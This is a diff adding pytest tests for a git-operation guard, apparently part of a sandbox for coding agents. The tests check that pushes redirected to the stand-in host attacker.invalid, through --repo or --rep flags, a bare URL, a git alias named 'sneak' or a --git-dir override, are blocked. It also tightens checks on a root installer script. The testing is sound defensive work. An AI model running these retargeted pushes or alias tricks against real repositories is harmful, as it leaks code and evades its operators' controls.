@@ -2826,6 +2826,80 @@ def test_controller_blocks_git_retargeting_options(
     assert "GIT_RETARGET_OPTION" in result.stdout
 
 
+@pytest.mark.parametrize(
+    "args",
+    [
+        ("push", "--repo=https://attacker.invalid/repo.git"),
+        ("push", "--repo", "https://attacker.invalid/repo.git"),
+        ("push", "--rep=https://attacker.invalid/repo.git"),
+        ("push", "--rep", "https://attacker.invalid/repo.git"),
+        ("push", "https://attacker.invalid/repo.git"),
+    ],
+)
+def test_controller_blocks_push_repository_override(
+    repo: tuple[Path, Path], tmp_path: Path, args: tuple[str, ...]
+) -> None:
+    _, worktree = repo
+    controller = build_controller(tmp_path)
+    result = run_controller(controller, worktree, worktree, *args)
+    assert result.returncode != 0
+    assert "CONTROLLER=BLOCKED" in result.stdout
+    assert "GIT_PUSH_REPOSITORY_OVERRIDE" in result.stdout
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ("--git-dir=/tmp/attacker", "status"),
+        ("-c", "alias.sneak=push", "sneak", "https://attacker.invalid/repo.git"),
+        ("push", "--repo=https://attacker.invalid/repo.git"),
+        ("push", "--rep=https://attacker.invalid/repo.git"),
+        ("push", "https://attacker.invalid/repo.git"),
+    ],
+)
+def test_direct_guard_enforces_git_operation_boundary(
+    repo: tuple[Path, Path], args: tuple[str, ...]
+) -> None:
+    _, worktree = repo
+    result = subprocess.run(
+        [
+            "/bin/bash",
+            "-p",
+            str(GUARD),
+            "--expected-workspace",
+            str(worktree),
+            "--",
+            "git",
+            *args,
+        ],
+        cwd=worktree,
+        capture_output=True,
+        text=True,
+        env=controller_env(),
+        check=False,
+    )
+    assert result.returncode != 0
+    assert "INVALID_INVOCATION" in result.stdout
+
+
+def test_controller_rejects_local_git_alias_as_non_builtin_subcommand(
+    repo: tuple[Path, Path], tmp_path: Path
+) -> None:
+    _, worktree = repo
+    git(worktree, "config", "alias.sneak", "push")
+    controller = build_controller(tmp_path)
+    result = run_controller(
+        controller,
+        worktree,
+        worktree,
+        "sneak",
+        "https://attacker.invalid/repo.git",
+    )
+    assert result.returncode != 0
+    assert "INVALID_INVOCATION" in result.stdout
+    assert "git_subcommand_not_builtin" in result.stdout
+
+
 def test_controller_allows_subcommand_c_option(
     repo: tuple[Path, Path], tmp_path: Path
 ) -> None:
@@ -2879,6 +2953,10 @@ def test_controller_defaults_to_system_managed_guard_and_installer_contract() ->
     assert 'TRUSTED_GUARD_PATH "/usr/local/libexec/anh-duong/coding_preflight.sh"' in source
     assert installer.exists()
     text = installer.read_text(encoding="utf-8")
-    assert "gcc -static" in text
+    lines = text.splitlines()
+    assert lines[2] == 'PATH="/usr/bin:/bin"'
+    assert lines[3] == "export PATH"
+    assert 'TMP="$(/usr/bin/mktemp -d -p /tmp)"' in text
+    assert "/usr/bin/env -i PATH=/usr/bin:/bin LC_ALL=C LANG=C /usr/bin/gcc -static" in text
     assert "install -o root -g root -m 0755" in text
     assert "coding_preflight.sh" in text
